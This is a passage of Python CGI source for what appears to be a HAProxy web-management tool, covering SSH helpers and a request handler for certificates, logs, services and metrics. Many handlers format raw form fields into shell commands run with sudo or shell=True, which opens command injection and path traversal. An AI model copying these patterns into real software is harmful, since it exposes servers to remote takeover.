error:\n\t\tprint('error: '+error)\n\tos.system(\"rm -f %s\" % script)\n\tssh_command(serv, commands, print_out=\"1\")\n\t\ndef waf_install(serv, **kwargs):\n\timport sql\n\tscript = \"waf.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tproxy = sql.get_setting('proxy')\n\thaproxy_dir = sql.get_setting('haproxy_dir')\n\tver = check_haproxy_version(serv)\n\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" + proxy+ \n\t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\tos.system(\"rm -f %s\" % script)\n\t\n\tstderr = ssh_command(serv, commands, print_out=\"1\")\n\tif stderr is None:\n\t\tsql.insert_waf_metrics_enable(serv, \"0\")\n\ndef check_haproxy_version(serv):\n\timport sql\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tver = \"\"\n\tcmd=\"echo 'show info' |nc %s %s |grep Version |awk '{print $2}'\" % (serv, haproxy_sock_port)\n\toutput, stderr = subprocess_execute(cmd)\n\tfor line in output:\n\t\tver = line\n\treturn ver\n\t\ndef upload(serv, path, file, **kwargs):\n\terror = \"\"\n\tfull_path = path + file\n\n\tif kwargs.get('dir') == \"fullpath\":\n\t\tfull_path = path\n\t\n\ttry:\n\t\tssh = ssh_connect(serv)\n\texcept Exception as e:\n\t\terror = e\n\t\tpass\n\ttry:\n\t\tsftp = ssh.open_sftp()\n\t\tfile = sftp.put(file, full_path)\n\t\tsftp.close()\n\t\tssh.close()\n\texcept Exception as e:\n\t\terror = e\n\t\tpass\n\t\t\n\treturn error\n\t\ndef upload_and_restart(serv, cfg, **kwargs):\n\timport sql\n\ttmp_file = sql.get_setting('tmp_config_path') + \"/\" + get_data('config') + \".cfg\"\n\terror = \"\"\n\t\n\ttry:\n\t\tos.system(\"dos2unix \"+cfg)\n\texcept OSError:\n\t\treturn 'Please install dos2unix' \n\t\tpass\n\t\n\tif kwargs.get(\"keepalived\") == 1:\n\t\tif kwargs.get(\"just_save\") == \"save\":\n\t\t\tcommands = [ \"sudo mv -f \" + tmp_file + \" /etc/keepalived/keepalived.conf\" ]\n\t\telse:\n\t\t\tcommands = [ \"sudo mv -f \" + tmp_file + \" /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived\" ]\n\telse:\n\t\tif kwargs.get(\"just_save\") == \"test\":\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo rm -f \" + tmp_file ]\n\t\telif kwargs.get(\"just_save\") == \"save\":\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo mv -f \" + tmp_file + \" \" + sql.get_setting('haproxy_config_path') ]\n\t\telse:\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo mv -f \" + tmp_file + \" \" + sql.get_setting('haproxy_config_path') + \" && sudo \" + sql.get_setting('restart_command') ]\t\n\t\tif sql.get_setting('firewall_enable') == \"1\":\n\t\t\tcommands.extend(open_port_firewalld(cfg))\n\t\n\terror += str(upload(serv, tmp_file, cfg, dir='fullpath'))\n\n\ttry:\n\t\terror += ssh_command(serv, commands)\n\texcept Exception as e:\n\t\terror += e\n\tif error:\n\t\treturn error\n\t\t\ndef open_port_firewalld(cfg):\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div>')\n\t\n\tfirewalld_commands = []\n\t\n\tfor line in conf:\n\t\tif \"bind\" in line:\n\t\t\tbind = line.split(\":\")\n\t\t\tbind[1] = bind[1].strip(' ')\n\t\t\tbind = bind[1].split(\"ssl\")\n\t\t\tbind = bind[0].strip(' \\t\\n\\r')\n\t\t\tfirewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind)\n\t\t\t\t\n\tfirewalld_commands.append('sudo firewall-cmd --reload')\n\treturn firewalld_commands\n\t\ndef check_haproxy_config(serv):\n\timport sql\n\tcommands = [ \"haproxy  -q -c -f %s\" % sql.get_setting('haproxy_config_path') ]\n\tssh = ssh_connect(serv)\n\tfor command in commands:\n\t\tstdin , stdout, stderr = ssh.exec_command(command, get_pty=True)\n\t\tif not stderr.read():\n\t\t\treturn True\n\t\telse:\n\t\t\treturn False\n\tssh.close()\n\t\t\ndef show_log(stdout):\n\ti = 0\n\tfor line in stdout:\n\t\ti = i + 1\n\t\tline_class = \"line3\" if i % 2 == 0 else \"line\"\n\t\tprint('<div class=\"'+line_class+'\">' + escape_html(line) + '</div>')\n\t\t\t\ndef show_ip(stdout):\n\tfor line in stdout:\n\t\tprint(line)\n\t\t\ndef server_status(stdout):\t\n\tproc_count = \"\"\n\t\n\tfor line in stdout:\n\t\tif \"Ncat: \" not in line:\n\t\t\tfor k in line:\n\t\t\t\tproc_count = k.split(\":\")[1]\n\t\telse:\n\t\t\tproc_count = 0\n\treturn proc_count\t\t\n\ndef ssh_command(serv, commands, **kwargs):\n\tssh = ssh_connect(serv)\n\t\t  \n\tfor command in commands:\n\t\ttry:\n\t\t\tstdin, stdout, stderr = ssh.exec_command(command, get_pty=True)\n\t\texcept:\n\t\t\tcontinue\n\t\t\t\t\n\t\tif kwargs.get(\"ip\") == \"1\":\n\t\t\tshow_ip(stdout)\n\t\telif kwargs.get(\"show_log\") == \"1\":\n\t\t\tshow_log(stdout)\n\t\telif kwargs.get(\"server_status\") == \"1\":\n\t\t\tserver_status(stdout)\n\t\telif kwargs.get('print_out'):\n\t\t\tprint(stdout.read().decode(encoding='UTF-8'))\n\t\t\treturn stdout.read().decode(encoding='UTF-8')\n\t\telif kwargs.get('retunr_err') == 1:\n\t\t\treturn stderr.read().decode(encoding='UTF-8')\n\t\telse:\n\t\t\treturn stdout.read().decode(encoding='UTF-8')\n\t\t\t\n\t\tfor line in stderr.read().decode(encoding='UTF-8'):\n\t\t\tif line:\n\t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\")\n\ttry:\t\n\t\tssh.close()\n\texcept:\n\t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'><b>X</b></a></div>\")\n\t\tpass\n\ndef escape_html(text):\n\treturn cgi.escape(text, quote=True)\n\t\ndef subprocess_execute(cmd):\n\timport subprocess \n\tp = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)\n\tstdout, stderr = p.communicate()\n\toutput = stdout.splitlines()\n\t\n\treturn output, stderr\n\ndef show_backends(serv, **kwargs):\n\timport json\n\timport sql\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tcmd='echo \"show backend\" |nc %s %s' % (serv, haproxy_sock_port)\n\toutput, stderr = subprocess_execute(cmd)\n\tret = \"\"\n\tfor line in output:\n\t\tif \"#\" in  line or \"stats\" in line:\n\t\t\tcontinue\n\t\tif line != \"\":\n\t\t\tback = json.dumps(line).split(\"\\\"\")\n\t\t\tif kwargs.get('ret'):\n\t\t\t\tret += back[1]\n\t\t\t\tret += \"<br />\"\n\t\t\telse:\n\t\t\t\tprint(back[1], end=\"<br>\")\n\t\t\n\tif kwargs.get('ret'):\n\t\treturn ret\n\t\t\ndef get_files(dir = get_config_var('configs', 'haproxy_save_configs_dir'), format = 'cfg', **kwargs):\n\timport glob\n\tfile = set()\n\treturn_files = set()\n\t\n\tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t\n\t\tfile.add(files.split('/')[-1])\n\tfiles = sorted(file, reverse=True)\n\n\tif format == 'cfg':\n\t\tfor file in files:\n\t\t\tip = file.split(\"-\")\n\t\t\tif serv == ip[0]:\n\t\t\t\treturn_files.add(file)\n\t\treturn sorted(return_files, reverse=True)\n\telse: \n\t\treturn files\n\t\ndef get_key(item):\n\treturn item[0]/n/n/napp/options.py/n/n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\"\nimport cgi\nimport os, sys\nimport funct\nimport sql\nimport ovw\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\nact = form.getvalue('act')\n\t\nprint('Content-type: text/html\\n')\n\nif act == \"checkrestart\":\n\tservers = sql.get_dick_permit(ip=serv)\n\tfor server in servers:\n\t\tif server != \"\":\n\t\t\tprint(\"ok\")\n\t\t\tsys.exit()\n\tsys.exit()\n\nif form.getvalue('token') is None:\n\tprint(\"What the fuck?! U r hacker Oo?!\")\n\tsys.exit()\n\t\t\nif form.getvalue('getcerts') is not None and serv is not None:\n\tcert_path = sql.get_setting('cert_path')\n\tcommands = [ \"ls -1t \"+cert_path+\" |grep pem\" ]\n\ttry:\n\t\tfunct.ssh_command(serv, commands, ip=\"1\")\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\nif form.getvalue('checkSshConnect') is not None and serv is not None:\n\ttry:\n\t\tfunct.ssh_command(serv, [\"ls -1t\"])\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\t\t\nif form.getvalue('getcert') is not None and serv is not None:\n\tid = form.getvalue('getcert')\n\tcert_path = sql.get_setting('cert_path')\n\tcommands = [ \"cat \"+cert_path+\"/\"+id ]\n\ttry:\n\t\tfunct.ssh_command(serv, commands, ip=\"1\")\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\t\t\nif form.getvalue('ssh_cert'):\n\tname = form.getvalue('name')\n\t\n\tif not os.path.exists(os.getcwd()+'/keys/'):\n\t\tos.makedirs(os.getcwd()+'/keys/')\n\t\n\tssh_keys = os.path.dirname(os.getcwd())+'/keys/'+name+'.pem'\n\t\n\ttry:\n\t\twith open(ssh_keys, \"w\") as conf:\n\t\t\tconf.write(form.getvalue('ssh_cert'))\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>')\n\telse:\n\t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys)\n\ttry:\n\t\tfunct.logging(\"local\", \"users.py#ssh upload new ssh cert %s\" % ssh_keys)\n\texcept:\n\t\tpass\n\t\t\t\nif serv and form.getvalue('ssl_cert'):\n\tcert_local_dir = funct.get_config_var('main', 'cert_local_dir')\n\tcert_path = sql.get_setting('cert_path')\n\t\n\tif not os.path.exists(cert_local_dir):\n\t\tos.makedirs(cert_local_dir)\n\t\n\tif form.getvalue('ssl_name') is None:\n\t\tprint('<div class=\"alert alert-danger\">Please enter desired name</div>')\n\telse:\n\t\tname = form.getvalue('ssl_name') + '.pem'\n\t\n\ttry:\n\t\twith open(name, \"w\") as ssl_cert:\n\t\t\tssl_cert.write(form.getvalue('ssl_cert'))\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>')\n\telse:\n\t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' % (serv, cert_path))\n\t\t\n\tMASTERS = sql.is_master(serv)\n\tfor master in MASTERS:\n\t\tif master[0] != None:\n\t\t\tfunct.upload(master[0], cert_path, name)\n\ttry:\n\t\tfunct.upload(serv, cert_path, name)\n\texcept:\n\t\tpass\n\t\n\tos.system(\"mv %s %s\" % (name, cert_local_dir))\n\tfunct.logging(serv, \"add.py#ssl upload new ssl cert %s\" % name)\n\t\nif form.getvalue('backend') is not None:\n\tfunct.show_backends(serv)\n\t\nif form.getvalue('ip') is not None and serv is not None:\n\tcommands = [ \"sudo ip a |grep inet |egrep -v  '::1' |awk '{ print $2  }' |awk -F'/' '{ print $1  }'\" ]\n\tfunct.ssh_command(serv, commands, ip=\"1\")\n\t\nif form.getvalue('showif'):\n\tcommands = [\"sudo ip link|grep 'UP' | awk '{print $2}'  |awk -F':' '{print $1}'\"]\n\tfunct.ssh_command(serv, commands, ip=\"1\")\n\t\nif form.getvalue('action_hap') is not None and serv is not None:\n\taction = form.getvalue('action_hap')\n\t\n\tif funct.check_haproxy_config(serv):\n\t\tcommands = [ \"sudo systemctl %s haproxy\" % action ]\n\t\tfunct.ssh_command(serv, commands)\t\t\n\t\tprint(\"HAproxy was %s\" % action)\n\telse:\n\t\tprint(\"Bad config, check please\")\n\t\nif form.getvalue('action_waf') is not None and serv is not None:\n\tserv = form.getvalue('serv')\n\taction = form.getvalue('action_waf')\n\n\tcommands = [ \"sudo systemctl %s waf\" % action ]\n\tfunct.ssh_command(serv, commands)\t\t\n\t\nif act == \"overview\":\n\tovw.get_overview()\n\t\nif act == \"overviewwaf\":\n\tovw.get_overviewWaf(form.getvalue('page'))\n\t\nif act == \"overviewServers\":\n\tovw.get_overviewServers()\n\t\nif form.getvalue('action'):\n\timport requests\n\tfrom requests_toolbelt.utils import dump\n\t\n\thaproxy_user = sql.get_setting('stats_user')\n\thaproxy_pass = sql.get_setting('stats_password')\n\tstats_port = sql.get_setting('stats_port')\n\tstats_page = sql.get_setting('stats_page')\n\t\n\tpostdata = {\n\t\t'action' : form.getvalue('action'),\n\t\t's' : form.getvalue('s'),\n\t\t'b' : form.getvalue('b')\n\t}\n\n\theaders = {\n\t\t'User-Agent' : 'Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0',\n\t\t'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n\t\t'Accept-Language' : 'en-US,en;q=0.5',\n\t\t'Accept-Encoding' : 'gzip, deflate'\n\t}\n\n\tq = requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass))\n\t\nif serv is not None and act == \"stats\":\n\timport requests\n\tfrom requests_toolbelt.utils import dump\n\t\n\thaproxy_user = sql.get_setting('stats_user')\n\thaproxy_pass = sql.get_setting('stats_password')\n\tstats_port = sql.get_setting('stats_port')\n\tstats_page = sql.get_setting('stats_page')\n\ttry:\n\t\tresponse = requests.get('http://%s:%s/%s' % (serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) \n\texcept requests.exceptions.ConnectTimeout:\n\t\tprint('Oops. Connection timeout occured!')\n\texcept requests.exceptions.ReadTimeout:\n\t\tprint('Oops. Read timeout occured')\n\texcept requests.exceptions.HTTPError as errh:\n\t\tprint (\"Http Error:\",errh)\n\texcept requests.exceptions.ConnectionError as errc:\n\t\tprint ('<div class=\"alert alert-danger\">Error Connecting: %s</div>' % errc)\n\texcept requests.exceptions.Timeout as errt:\n\t\tprint (\"Timeout Error:\",errt)\n\texcept requests.exceptions.RequestException as err:\n\t\tprint (\"OOps: Something Else\",err)\n\t\t\n\tdata = response.content\n\tprint(data.decode('utf-8'))\n\nif serv is not None and form.getvalue('rows') is not None:\n\trows = form.getvalue('rows')\n\twaf = form.getvalue('waf')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\t\n\tif grep is not None:\n        \tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\n\tsyslog_server_enable = sql.get_setting('syslog_server_enable')\n\tif syslog_server_enable is None or syslog_server_enable == \"0\":\n\t\tlocal_path_logs = sql.get_setting('local_path_logs')\n\t\tsyslog_server = serv\t\n\t\tcommands = [ \"sudo cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (local_path_logs, date, date1, rows, grep_act, grep) ]\t\t\n\telse:\n\t\tcommands = [ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s  %s %s\" % (serv, date, date1, rows, grep_act, grep) ]\n\t\tsyslog_server = sql.get_setting('syslog_server')\n\t\n\tif waf == \"1\":\n\t\tlocal_path_logs = '/var/log/modsec_audit.log'\n\t\tcommands = [ \"sudo cat %s |tail -%s  %s %s\" % (local_path_logs, rows, grep_act, grep) ]\t\n\t\t\n\tfunct.ssh_command(syslog_server, commands, show_log=\"1\")\n\t\nif serv is not None and form.getvalue('rows1') is not None:\n\trows = form.getvalue('rows1')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\tapache_log_path = sql.get_setting('apache_log_path')\n\t\n\tif grep is not None:\n\t\tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\t\t\n\tif serv == 'haproxy-wi.access.log':\n\t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep)\n\telse:\n\t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s  %s %s\" % (apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep)\n\n\toutput, stderr = funct.subprocess_execute(cmd)\n\n\tfunct.show_log(output)\n\tprint(stderr)\n\t\t\nif form.getvalue('viewlogs') is not None:\n\tviewlog = form.getvalue('viewlogs')\n\tlog_path = funct.get_config_var('main', 'log_path')\n\trows = form.getvalue('rows2')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\t\n\tif grep is not None:\n\t\tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\n\tcmd=\"cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (log_path + viewlog, date, date1, rows, grep_act, grep)\n\toutput, stderr = funct.subprocess_execute(cmd)\n\n\tfunct.show_log(output)\n\tprint(stderr)\n\t\t\nif serv is not None and act == \"showMap\":\n\tovw.get_map(serv)\n\t\nif form.getvalue('servaction') is not None:\n\tserver_state_file = sql.get_setting('server_state_file')\n\thaproxy_sock = sql.get_setting('haproxy_sock')\n\tenable = form.getvalue('servaction')\n\tbackend = form.getvalue('servbackend')\t\n\tcmd='echo \"%s %s\" |sudo socat stdio %s | cut -d \",\" -f 1-2,5-10,18,34-36 | column -s, -t' % (enable, backend, haproxy_sock)\n\t\n\tif form.getvalue('save') == \"on\":\n\t\tsave_command = 'echo \"show servers state\" | sudo socat stdio %s > %s' % (haproxy_sock, server_state_file)\n\t\tcommand = [ cmd, save_command ] \n\telse:\n\t\tcommand = [ cmd ] \n\t\t\n\tif enable != \"show\":\n\t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' % (enable, backend, serv, serv))\n\t\t\t\n\tfunct.ssh_command(serv, command, show_log=\"1\")\n\taction = 'edit.py ' + enable + ' ' + backend\n\tfunct.logging(serv, action)\n\nif act == \"showCompareConfigs\":\n\timport glob\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True)\n\ttemplate = env.get_template('/show_compare_configs.html')\n\tleft = form.getvalue('left')\n\tright = form.getvalue('right')\n\t\n\ttemplate = template.render(serv=serv, right=right, left=left, return_files=funct.get_files())\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\nif serv is not None and form.getvalue('right') is not None:\n\tfrom jinja2 import Environment, FileSystemLoader\n\tleft = form.getvalue('left')\n\tright = form.getvalue('right')\n\thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\tcmd='diff -ub %s%s %s%s' % (hap_configs_dir, left, hap_configs_dir, right)\t\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n\ttemplate = env.get_template('compare.html')\n\t\n\toutput, stderr = funct.subprocess_execute(cmd)\n\ttemplate = template.render(stdout=output)\t\n\t\n\tprint(template)\n\tprint(stderr)\n\t\nif serv is not None and act == \"configShow\":\n\thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\t\n\tif form.getvalue('configver') is None:\t\n\t\tcfg = hap_configs_dir + serv + \"-\" + funct.get_data('config') + \".cfg\"\n\t\tfunct.get_config(serv, cfg)\n\telse: \n\t\tcfg = hap_configs_dir + form.getvalue('configver')\n\t\t\t\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\t\t#conf = conf.read()\n\t\t#conf = funct.escape_html(conf)\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>')\n\t\t\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols'])\n\ttemplate = env.get_template('config_show.html')\n\t\n\ttemplate = template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\n\tif form.getvalue('configver') is None:\n\t\tos.system(\"/bin/rm -f \" + cfg)\t\n\t\t\nif form.getvalue('master'):\n\tmaster = form.getvalue('master')\n\tslave = form.getvalue('slave')\n\tinterface = form.getvalue('interface')\n\tvrrpip = form.getvalue('vrrpip')\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tscript = \"install_keepalived.sh\"\n\t\n\tif form.getvalue('hap') == \"1\":\n\t\tfunct.install_haproxy(master)\n\t\tfunct.install_haproxy(slave)\n\t\t\n\tif form.getvalue('syn_flood') == \"1\":\n\t\tfunct.syn_flood_protect(master)\n\t\tfunct.syn_flood_protect(slave)\n\t\n\tos.system(\"cp scripts/%s .\" % script)\n\t\t\n\terror = str(funct.upload(master, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\tsys.exit()\n\tfunct.upload(slave, tmp_config_path, script)\n\n\tfunct.ssh_command(master, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip])\n\tfunct.ssh_command(slave, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip])\n\t\t\t\n\tos.system(\"rm -f %s\" % script)\n\tsql.update_server_master(master, slave)\n\t\nif form.getvalue('masteradd'):\n\tmaster = form.getvalue('masteradd')\n\tslave = form.getvalue('slaveadd')\n\tinterface = form.getvalue('interfaceadd')\n\tvrrpip = form.getvalue('vrrpipadd')\n\tkp = form.getvalue('kp')\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tscript = \"add_vrrp.sh\"\n\t\n\tos.system(\"cp scripts/%s .\" % script)\n\t\t\n\terror = str(funct.upload(master, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\tsys.exit()\n\tfunct.upload(slave, tmp_config_path, script)\n\t\n\tfunct.ssh_command(master, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp])\n\tfunct.ssh_command(slave, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip+\" \"+kp])\n\t\t\t\n\tos.system(\"rm -f %s\" % script)\n\t\nif form.getvalue('haproxyaddserv'):\n\tfunct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood'))\n\t\nif form.getvalue('installwaf'):\n\tfunct.waf_install(form.getvalue('installwaf'))\n\t\nif form.getvalue('metrics_waf'):\n\tsql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable'))\n\t\t\nif form.getvalue('table_metrics'):\n\timport http.cookies\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'))\n\ttemplate = env.get_template('table_metrics.html')\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\ttable_stat = sql.select_table_metrics(user_id.value)\n\n\ttemplate = template.render(table_stat=sql.select_table_metrics(user_id.value))\t\t\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\t\nif form.getvalue('metrics'):\n\tfrom datetime import timedelta\n\tfrom bokeh.plotting import figure, output_file, show\n\tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker\n\tfrom bokeh.layouts import widgetbox, gridplot\n\tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select\n\timport pandas as pd\n\timport http.cookies\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\tservers = sql.select_servers_metrics(user_id.value)\n\tservers = sorted(servers)\n\t\n\tp = {}\n\tfor serv in servers:\n\t\tserv = serv[0]\n\t\tp[serv] = {}\n\t\tmetric = sql.select_metrics(serv)\n\t\tmetrics = {}\n\t\t\n\t\tfor i in metric:\n\t\t\trep_date = str(i[5])\n\t\t\tmetrics[rep_date] = {}\n\t\t\tmetrics[rep_date]['server'] = str(i[0])\n\t\t\tmetrics[rep_date]['curr_con'] = str(i[1])\n\t\t\tmetrics[rep_date]['curr_ssl_con'] = str(i[2])\n\t\t\tmetrics[rep_date]['sess_rate'] = str(i[3])\n\t\t\tmetrics[rep_date]['max_sess_rate'] = str(i[4])\n\n\t\tdf = pd.DataFrame.from_dict(metrics, orient=\"index\")\n\t\tdf = df.fillna(0)\n\t\tdf.index = pd.to_datetime(df.index)\n\t\tdf.index.name = 'Date'\n\t\tdf.sort_index(inplace=True)\n\t\tsource = ColumnDataSource(df)\n\t\t\n\t\toutput_file(\"templates/metrics_out.html\", mode='inline')\n\t\t\n\t\tx_min = df.index.min() - pd.Timedelta(hours=1)\n\t\tx_max = df.index.max() + pd.Timedelta(minutes=1)\n\n\t\tp[serv] = figure(\n\t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\t\t\n\t\t\ttitle=metric[0][0],\n\t\t\tx_axis_type=\"datetime\", y_axis_label='Connections',\n\t\t\tx_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)\n\t\t\t)\n\t\t\t\n\t\thover = HoverTool(\n\t\t\ttooltips=[\n\t\t\t\t(\"Connections\", \"@curr_con\"),\n\t\t\t\t(\"SSL connections\", \"@curr_ssl_con\"),\n\t\t\t\t(\"Sessions rate\", \"@sess_rate\")\n\t\t\t],\n\t\t\tmode='mouse'\n\t\t)\n\t\t\n\t\tp[serv].ygrid.band_fill_color = \"#f3f8fb\"\n\t\tp[serv].ygrid.band_fill_alpha = 0.9\n\t\tp[serv].y_range.start = 0\n\t\tp[serv].y_range.end = int(df['curr_con'].max()) + 150\n\t\tp[serv].add_tools(hover)\n\t\tp[serv].title.text_font_size = \"20px\"\t\t\t\t\t\t\n\t\tp[serv].line(\"Date\", \"curr_con\", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=\"Conn\")\n\t\tp[serv].line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\"#5d9ceb\", line_width=2, legend=\"SSL con\")\n\t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\"#33414e\", line_width=2, legend=\"Sessions\")\n\t\tp[serv].legend.orientation = \"horizontal\"\n\t\tp[serv].legend.location = \"top_left\"\n\t\tp[serv].legend.padding = 5\n\n\tplots = []\n\tfor key, value in p.items():\n\t\tplots.append(value)\n\t\t\n\tgrid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = \"left\", toolbar_options=dict(logo=None))\n\tshow(grid)\n\t\nif form.getvalue('waf_metrics'):\n\tfrom datetime import timedelta\n\tfrom bokeh.plotting import figure, output_file, show\n\tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker\n\tfrom bokeh.layouts import widgetbox, gridplot\n\tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select\n\timport pandas as pd\n\timport http.cookies\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\tservers = sql.select_waf_servers_metrics(user_id.value)\n\tservers = sorted(servers)\n\t\n\tp = {}\n\tfor serv in servers:\n\t\tserv = serv[0]\n\t\tp[serv] = {}\n\t\tmetric = sql.select_waf_metrics(serv)\n\t\tmetrics = {}\n\t\t\n\t\tfor i in metric:\n\t\t\trep_date = str(i[2])\n\t\t\tmetrics[rep_date] = {}\n\t\t\tmetrics[rep_date]['conn'] = str(i[1])\n\n\t\tdf = pd.DataFrame.from_dict(metrics, orient=\"index\")\n\t\tdf = df.fillna(0)\n\t\tdf.index = pd.to_datetime(df.index)\n\t\tdf.index.name = 'Date'\n\t\tdf.sort_index(inplace=True)\n\t\tsource = ColumnDataSource(df)\n\t\t\n\t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline')\n\t\t\n\t\tx_min = df.index.min() - pd.Timedelta(hours=1)\n\t\tx_max = df.index.max() + pd.Timedelta(minutes=1)\n\n\t\tp[serv] = 